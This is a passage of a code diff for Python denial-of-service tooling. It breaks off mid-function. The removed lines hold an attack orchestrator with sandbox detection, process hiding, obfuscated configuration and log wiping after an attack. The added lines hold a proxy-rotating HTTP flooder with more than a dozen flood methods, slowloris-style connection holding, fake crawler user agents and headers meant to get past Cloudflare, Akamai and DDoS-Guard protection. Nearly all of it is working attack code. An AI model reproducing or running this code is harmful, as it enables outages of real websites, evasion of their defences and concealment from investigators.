+				print(f"{Fore.LIGHTGREEN_EX}[+] Got {len(response.text.split(chr(10)))} proxies from this source{Fore.RESET}")
+			else:
+				print(f"{Fore.LIGHTRED_EX}[-] Failed: Status {response.status_code}{Fore.RESET}")
+		except Exception as e:
+			print(f"{Fore.LIGHTRED_EX}[-] Error downloading from {source}: {str(e)[:50]}{Fore.RESET}")
+	
+	# Remove duplicates
+	proxies_list = list(set(proxies_list))
+	
+	print(f"\n{Fore.LIGHTGREEN_EX}[+] Total unique proxies collected: {len(proxies_list)}{Fore.RESET}")
+	
+	# Save to file
+	if proxies_list:
+		with open("proxies_real.txt", "w") as f:
+			for proxy in proxies_list:
+				f.write(proxy + "\n")
+		print(f"{Fore.LIGHTGREEN_EX}[+] Proxies saved to proxies_real.txt{Fore.RESET}\n")
+	
+	return proxies_list
 
-# ==================== 7️⃣ ANTI-DETECTION & LOG OBFUSCATION ====================
-class AntiDetectionSystem:
-    """Hide traces, prevent analysis"""
-    
-    def __init__(self):
-        self.process_name_original = None
-        self.hidden_mode = False
-        
-    def detect_sandbox(self) -> bool:
-        """Detect if running in sandbox/VM"""
-        indicators = [
-            'VirtualBox' in platform.platform(),
-            'VMware' in platform.platform(),
-            'QEMU' in platform.platform(),
-            os.path.exists('/proc/vz/') or os.path.exists('/proc/bc/'),  # OpenVZ
-        ]
-        return any(indicators)
-    
-    def hide_process(self):
-        """Try to hide process"""
-        try:
-            if platform.system() == 'Linux':
-                # Change process name (requires special permission)
-                os.popen(f"exec -a 'python' $0")
-        except:
-            pass
-    
-    def obfuscate_config(self, config: Dict) -> str:
-        """Encrypt config file"""
-        config_json = json.dumps(config)
-        
-        # XOR encryption
-        key = hashlib.sha256(b"ultra_secret_config_key_v6").digest()
-        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(config_json.encode())])
-        
-        return base64.b64encode(encrypted).decode()
-    
-    def deobfuscate_config(self, encrypted_config: str) -> Dict:
-        """Decrypt config file"""
-        encrypted = base64.b64decode(encrypted_config)
-        key = hashlib.sha256(b"ultra_secret_config_key_v6").digest()
-        decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(encrypted)]).decode()
-        
-        return json.loads(decrypted)
-    
-    def cleanup_traces(self):
-        """Clean up log files after attack"""
-        logger.clear_logs()
-        try:
-            if os.path.exists('attack.log'):
-                os.remove('attack.log')
-        except:
-            pass
+def build_threads(mode,thread_num,event,socks_type,ind_rlock):
+	methods = {
+		"cc": cc, "post": post, "head": head, "ovh": ovh, "rhex": rhex,
+		"stomp": stomp, "stress": stress, "dyn": dyn, "downloader": downloader,
+		"cfb": cfb, "null": null, "cookie": cookie, "pps": pps, "even": even,
+		"gsb": gsb, "dgb": dgb, "avb": avb, "bot": bot, "apache": apache,
+		"xmlrpc": xmlrpc, "cfbuam": cfbuam, "bypass": bypass, "killer": killer,
+		"advanced": advanced, "amplify": amplify, "hybrid": hybrid, "cannon": cannon,
+		"turbo": turbo, "overdrive": overdrive
+	}
+	
+	if mode == "slow":
+		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
+		th.setDaemon(True)
+		th.start()
+	elif mode == "tor":
+		th = threading.Thread(target=tor,args=(thread_num,socks_type,))
+		th.setDaemon(True)
+		th.start()
+	else:
+		func = methods.get(mode, cc)
+		for _ in range(thread_num):
+			th = threading.Thread(target=func,args=(event,socks_type,ind_rlock,))
+			th.setDaemon(True)
+			th.start()
 
-# ==================== ORCHESTRATOR ====================
-class V6_NIGHTMARE_Orchestrator:
-    """Master controller"""
-    
-    def __init__(self):
-        self.async_optimizer = UltraAsyncOptimizer(max_connections=500)
-        self.proxy_manager = QuantumProxyManager()
-        self.waf_engine = AdaptiveWAFEngine()
-        self.fingerprint_analyzer = MLFingerprintAnalyzer()
-        self.payload_mutator = AdvancedPayloadMutator()
-        self.path_distributor = IntelligentPathDistributor()
-        self.anti_detection = AntiDetectionSystem()
-        
-        self.stats = {
-            'requests_sent': 0,
-            'successful': 0,
-            'failed': 0,
-            'bytes_sent': 0,
-            'start_time': time.time()
-        }
-    
-    async def initialize(self):
-        """Setup everything"""
-        await self.async_optimizer.init_session()
-        print(f"{Fore.LIGHTGREEN_EX}[+] V6 NIGHTMARE Initialized{Fore.RESET}")
-    
-    async def execute_attack(self, target: str, port: int, proxies: List[str], threads: int = 100):
-        """Main attack loop"""
-        
-        # 1. Fingerprint target
-        print(f"{Fore.CYAN}[*] Analyzing target...{Fore.RESET}")
-        fingerprint = await self.fingerprint_analyzer.analyze_target(target, port)
-        print(f"{Fore.LIGHTGREEN_EX}[+] Fingerprint: {fingerprint}{Fore.RESET}")
-        
-        # 2. Discover heavy endpoints
-        print(f"{Fore.CYAN}[*] Discovering endpoints...{Fore.RESET}")
-        endpoints = await self.path_distributor.discover_endpoints(target, port)
-        print(f"{Fore.LIGHTGREEN_EX}[+] Heavy endpoints: {endpoints}{Fore.RESET}")
-        
-        # 3. Add proxies
-        self.proxy_manager.add_proxies(proxies)
-        
-        # 4. Launch attack tasks
-        tasks = [
-            self._attack_worker(target, port, i)
-            for i in range(threads)
-        ]
-        
-        try:
-            await asyncio.gather(*tasks)
-        except KeyboardInterrupt:
-            print(f"\n{Fore.LIGHTYELLOW_EX}[!] Attack stopped{Fore.RESET}")
-        finally:
-            await self.async_optimizer.close_session()
-            self._print_stats()
-    
-    async def _attack_worker(self, target: str, port: int, worker_id: int):
-        """Single attack worker"""
-        while True:
-            try:
-                # Select components
-                proxy = self.proxy_manager.select_proxy()
-                if not proxy:
-                    await asyncio.sleep(1)
-                    continue
-                
-                path = self.path_distributor.select_path()
-                method, path, data = self.payload_mutator.mutate_request('GET', path, level=self.waf_engine.current_level)
-                headers = self.waf_engine.get_evasion_headers()
-                
-                # Make request
-                url = f"{'https' if port == 443 else 'http'}://{target}:{port}{path}"
-                response = await self.async_optimizer.async_request(method, url, headers=headers, data=data, proxy=proxy)
-                
-                # Analyze response
-                analysis = self.waf_engine.analyze_response(response)
-                action = analysis.get('action')
-                
-                # Update metrics
-                self.proxy_manager.update_proxy_metrics(proxy, response)
-                self.stats['requests_sent'] += 1
-                self.stats['successful'] += response.get('success', False)
-                
-                # Adapt
-                if action == 'backoff':
-                    await asyncio.sleep(analysis['adjust_delay'])
-                elif action == 'evasion':
-                    self.waf_engine.current_level = analysis['next_level']
-                
-                # Small delay
-                await asyncio.sleep(random.uniform(0.01, 0.05))
-                
-            except Exception as e:
-                logger.log("ERROR", f"Worker {worker_id}: {e}")
-                await asyncio.sleep(0.1)
-    
-    def _print_stats(self):
-        """Display final statistics"""
-        elapsed = time.time() - self.stats['start_time']
-        rps = self.stats['requests_sent'] / elapsed
-        
-        print(f"\n{Fore.LIGHTGREEN_EX}{'='*70}")
-        print(f"{'ATTACK COMPLETE':^70}")
-        print(f"{'='*70}")
-        print(f"Total Requests: {self.stats['requests_sent']:,}")
-        print(f"Successful: {self.stats['successful']:,}")
-        print(f"Failed: {self.stats['failed']:,}")
-        print(f"RPS: {rps:,.0f}")
-        print(f"Duration: {elapsed:.2f}s")
-        print(f"{Fore.LIGHTGREEN_EX}{'='*70}{Fore.RESET}\n")
+def getuseragent():
+	agents = [
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+	]
+	return Choice(agents)
 
-# ==================== MAIN ====================
-async def main():
-    print(f'''{Fore.RED}
-    ╔═══════════════════════════════════════════════════════╗
-    ║     ULTRA PRO V6 NIGHTMARE - GOVERNMENT LEVEL         ║
-    ║     Advanced DDoS Framework with AI/ML                ║
-    ║     Async Optimization + Adaptive Evasion             ║
-    ╚═══════════════════════════════════════════════════════╝
-    {Fore.RESET}''')
-    
-    # Initialize
-    orchestrator = V6_NIGHTMARE_Orchestrator()
-    await orchestrator.initialize()
-    
-    # User input
-    target = input(f"{Fore.CYAN}[?] Target URL: {Fore.RESET}")
-    port = int(input(f"{Fore.CYAN}[?] Port (default 80): {Fore.RESET}") or "80")
-    threads = int(input(f"{Fore.CYAN}[?] Threads (default 100): {Fore.RESET}") or "100")
-    
-    # Proxy list
-    proxy_file = input(f"{Fore.CYAN}[?] Proxy file: {Fore.RESET}")
-    try:
-        with open(proxy_file) as f:
-            proxies = [p.strip() for p in f if p.strip() and ':' in p]
-    except:
-        print(f"{Fore.LIGHTRED_EX}[!] Cannot read proxy file{Fore.RESET}")
-        return
-    
-    # Execute
-    await orchestrator.execute_attack(target, port, proxies, threads)
+def randomurl():
+	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
+
+def GenReqHeader(method):
+	global data
+	header = ""
+	if method == "get" or method == "head":
+		connection = "Connection: Keep-Alive\r\n"
+		if cookies != "":
+			connection += "Cookies: "+str(cookies)+"\r\n"
+		accept = Choice(acceptall)
+		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
+		useragent = "User-Agent: " + getuseragent() + "\r\n"
+		header =  referer + useragent + accept + connection + "\r\n"
+	elif method == "post":
+		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+		refer = "Referer: http://"+ target + path + "\r\n"
+		user_agent = "User-Agent: " + getuseragent() + "\r\n"
+		accept = Choice(acceptall)
+		if mode2 != "y":
+			data = str(random._urandom(16))
+		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
+		if cookies != "":
+			length += "Cookies: "+str(cookies)+"\r\n"
+		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+	return header
+
+def ParseUrl(original_url):
+	global target, path, port, protocol
+	original_url = original_url.strip()
+	url = ""
+	path = "/"
+	port = 80
+	protocol = "http"
+	if original_url[:7] == "http://":
+		url = original_url[7:]
+	elif original_url[:8] == "https://":
+		url = original_url[8:]
+		protocol = "https"
+	tmp = url.split("/")
+	website = tmp[0]
+	check = website.split(":")
+	if len(check) != 1:
+		port = int(check[1])
+	else:
+		if protocol == "https":
+			port = 443
+	target = check[0]
+	if len(tmp) > 1:
+		path = url.replace(website,"",1)
+
+def InputOption(question,options,default):
+	ans = ""
+	while ans == "":
+		ans = str(input(question)).strip().lower()
+		if ans == "":
+			ans = default
+		elif ans not in options:
+			print("~ Please enter the correct option")
+			ans = ""
+			continue
+	return ans
+
+def SetupIndDict():
+	global ind_dict
+	for proxy in proxies:
+		ind_dict[proxy.strip()] = 0
+
+def OutputToScreen(ind_rlock):
+	global ind_dict
+	i = 0
+	sp_char = ["|","/","-","\\"]
+	while 1:
+		if i > 3:
+			i = 0
+		
+		os.system('cls' if os.name == 'nt' else 'clear')
+		print(f"\n{Fore.LIGHTRED_EX}{'╔' + '═'*68 + '╗':^70}")
+		print(f"{'║' + 'MHDDOS ULTRA PRO V2 - ADVANCED DDoS'.center(68) + '║':^70}")
+		print(f"{'╚' + '═'*68 + '╝':^70}{Fore.RESET}\n")
+		
+		stat = stats.get_stats()
+		
+		print(f"{Fore.CYAN}📊 ULTRA STATISTICS:{Fore.RESET}")
+		print(f"  Total Requests: {Fore.LIGHTYELLOW_EX}{stat['requests']:,}{Fore.RESET}")
+		print(f"  Current RPS: {Fore.LIGHTGREEN_EX}{stat['rps']:,.0f}{Fore.RESET}")
+		print(f"  Peak RPS: {Fore.LIGHTRED_EX}{stat['peak_rps']:,.0f}{Fore.RESET}")
+		print(f"  Data Sent: {Fore.LIGHTYELLOW_EX}{stat['mbps']:.2f} MB/s{Fore.RESET}")
+		print(f"  Success Rate: {Fore.LIGHTGREEN_EX}{stat['success_rate']:.1f}%{Fore.RESET}")
+		print(f"  Errors: {Fore.LIGHTRED_EX}{stat['errors']:,}{Fore.RESET}\n")
+		
+		print(f"{Fore.YELLOW}{'TOP 15 PROXY PERFORMANCE':^70}{Fore.RESET}")
+		print(f"{Fore.CYAN}{'IP:PORT':<30} {'RPS':<20} {'STATUS':<20}{Fore.RESET}")
+		print(f"{Fore.LIGHTGREEN_EX}{'─'*70}{Fore.RESET}")
+		
+		ind_rlock.acquire()
+		top15= sorted(ind_dict, key=ind_dict.get, reverse=True)[:15]
+		for num, top in enumerate(top15):
+			rps = ind_dict[top]
+			ind_dict[top] = 0
+			status = f"{Fore.LIGHTGREEN_EX}✓ Active{Fore.RESET}" if rps > 0 else f"{Fore.LIGHTRED_EX}✗ Idle{Fore.RESET}"
+			print(f"{num+1:2d}. {top:<28} {rps:<20} {status:<20}")
+		ind_rlock.release()
+		
+		print(f"\n{Fore.LIGHTRED_EX}{sp_char[i]:^70}")
+		print(f"{'🔥 DDOS ATTACK IN PROGRESS - MAXIMUM POWER 🔥':^70}{Fore.RESET}\n")
+		i+=1
+		time.sleep(1)
+
+def apply_ultra_bypass_headers(headers_type="cloudflare_super"):
+	"""Apply ultra bypass headers"""
+	headers_dict = ULTRA_BYPASS_HEADERS.get(headers_type, ULTRA_BYPASS_HEADERS["cloudflare_super"])
+	headers_str = ""
+	for key, value in random.sample(headers_dict, min(5, len(headers_dict))):
+		if callable(value):
+			headers_str += f"{key}: {value()}\r\n"
+		else:
+			headers_str += f"{key}: {value}\r\n"
+	return headers_str
+
+# ========== CANNON 2.0 - ULTIMATE METHOD ==========
+def cannon(event,socks_type,ind_rlock):
+	"""CANNON 2.0 - Ultimate Multi-Vector Attack"""
+	proxy_list = proxies.copy()
+	proxy = Choice(proxy_list).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	bypass_types = list(ULTRA_BYPASS_HEADERS.keys())
+	
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s, server_hostname=target)
+			
+			for n in range(3000):
+				bypass_type = Choice(bypass_types)
+				bypass_headers = apply_ultra_bypass_headers(bypass_type)
+				
+				method_choice = n % 5
+				if method_choice == 0:
+					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				elif method_choice == 1:
+					req = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('head')}"
+				elif method_choice == 2:
+					payload = f"id={Intn(1,999999)}&data={'A'*10000}"
+					req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				elif method_choice == 3:
+					subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
+					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {subdomain}.{target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				else:
+					hex_param = ''.join(random.choices('0123456789abcdef', k=32))
+					req = f"GET {path}{add}{hex_param} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 3000
+			ind_rlock.release()
+			proxy = Choice(proxy_list).strip().split(":")
+		except:
+			stats.add_error()
+			try:
+				s.close()
+			except:
+				pass
+
+def turbo(event,socks_type,ind_rlock):
+	"""TURBO - Fast attack with max bypass"""
+	proxy_list = proxies.copy()
+	proxy = Choice(proxy_list).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s, server_hostname=target)
+			
+			for n in range(2500):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 2500
+			ind_rlock.release()
+			proxy = Choice(proxy_list).strip().split(":")
+		except:
+			stats.add_error()
+
+def overdrive(event,socks_type,ind_rlock):
+	"""OVERDRIVE - Maximum firepower"""
+	proxy_list = proxies.copy()
+	proxy = Choice(proxy_list).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s, server_hostname=target)
+			
+			# Send massive requests
+			for n in range(5000):
+				bypass_headers = apply_ultra_bypass_headers(Choice(list(ULTRA_BYPASS_HEADERS.keys())))
+				payload = "X" * 50000
+				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 5000
+			ind_rlock.release()
+			proxy = Choice(proxy_list).strip().split(":")
+		except:
+			stats.add_error()
+
+# ========== OTHER METHODS ==========
+def cc(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def post(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(400):
+				bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
+				req = GenReqHeader("post")
+				full_req = f"{bypass_headers}{req}"
+				sent = s.send(str.encode(full_req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 400
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def head(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(600):
+				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
+				req = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('head')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 600
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def ovh(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def rhex(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				hex_param = ''.join(random.choices('0123456789abcdef', k=32))
+				bypass_headers = apply_ultra_bypass_headers("nginx_bypass")
+				req = f"GET {path}{add}{hex_param} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def stomp(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("apache_bypass")
+				req = f"GET {path}{add}chk_captcha={randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def stress(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(200):
+				payload = "X" * 50000
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 200
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def dyn(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path} HTTP/1.1\r\nHost: {subdomain}.{target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def downloader(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(100):
+				bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nRange: bytes=0-999999999\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				time.sleep(0.05)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 100
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+socket_list=[]
+def slow(conn,socks_type):
+	proxy = Choice(proxies).strip().split(":")
+	for _ in range(conn):
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(1)
+			s.connect((str(target), int(port)))
+			if str(port) == '443':
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			s.send(f"GET /?{Intn(0, 2000)} HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))
+			s.send(f"User-Agent: {getuseragent()}\r\n".encode("utf-8"))
+			s.send(b"Accept-language: en-US,en,q=0.5\r\n")
+			if cookies:
+				s.send(f"Cookies: {cookies}\r\n".encode("utf-8"))
+			s.send(b"Connection:keep-alive")
+			socket_list.append(s)
+		except:
+			pass
+	while True:
+		for s in list(socket_list):
+			try:
+				s.send(f"X-a: {Intn(1, 5000)}\r\n".encode("utf-8"))
+				stats.add_request(20)
+			except:
+				try:
+					socket_list.remove(s)
+					s.close()
+				except:
+					pass
+
+def cfb(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
